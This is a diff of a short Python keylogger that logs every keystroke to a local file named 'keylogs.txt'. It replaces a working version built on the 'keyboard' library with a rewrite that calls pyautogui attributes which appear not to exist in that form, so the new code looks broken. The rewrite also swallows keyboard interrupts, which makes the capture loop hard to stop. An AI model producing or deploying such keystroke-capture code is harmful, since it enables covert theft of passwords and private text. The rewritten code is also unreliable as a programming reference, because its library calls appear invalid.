@@ -1,12 +1,18 @@
-import keyboard
+import pyautogui
 
-with open('keylogs.txt', 'a') as f:
+def record_keystrokes():
+    file = open('keylogs.txt', 'a')
     while True:
-        key = keyboard.read_key()
-        if key == '\x1b':
-            break
-        if key.isprintable():
-            f.write(key)
-        else:
-            f.write('[' + key + ']')
-        print(key, end='')
+        try:
+            key = pyautogui.KEYBOARD_LIST[pyautogui.keyboard.read_key()]
+            if key == '\x1b':
+                break
+            elif key.isalpha():
+                file.write(key)
+            else:
+                file.write('[' + key + ']')
+        except KeyboardInterrupt:
+            pass
+    file.close()
+
+record_keystrokes()
